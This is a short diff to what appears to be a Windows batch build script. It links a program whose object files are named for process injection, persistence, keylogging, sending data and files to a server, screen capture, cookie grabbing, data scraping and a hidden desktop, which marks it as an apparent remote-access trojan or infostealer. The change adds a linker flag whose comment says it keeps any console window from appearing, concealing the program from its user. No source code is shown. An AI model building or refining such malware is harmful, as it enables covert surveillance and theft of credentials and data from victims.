@@ -31,7 +31,8 @@ REM Compile the application manifest
 windres app.rc -O coff -o app.res
 
 REM Link everything together with all required libraries
-g++ -o myapp.exe app.res main.o injection.o persistence.o keyboard.o utils.o exec_command.o send_to_server.o send_file.o screen_capture.o file_browser.o process_utils.o cookie_grabber.o data_scraper.o hidden_desktop.o -lpsapi -ladvapi32 -luser32 -lkernel32 -lws2_32 -lgdi32 -lgdiplus -ld3d11 -ldxgi -lshlwapi -lole32 -lwininet -lwindowscodecs -lwtsapi32 -lcrypt32 -static -std=c++17
+REM -mwindows flag: GUI subsystem (no console window appears)
+g++ -o myapp.exe app.res main.o injection.o persistence.o keyboard.o utils.o exec_command.o send_to_server.o send_file.o screen_capture.o file_browser.o process_utils.o cookie_grabber.o data_scraper.o hidden_desktop.o -lpsapi -ladvapi32 -luser32 -lkernel32 -lws2_32 -lgdi32 -lgdiplus -ld3d11 -ldxgi -lshlwapi -lole32 -lwininet -lwindowscodecs -lwtsapi32 -lcrypt32 -static -std=c++17 -mwindows
 
 
 echo.
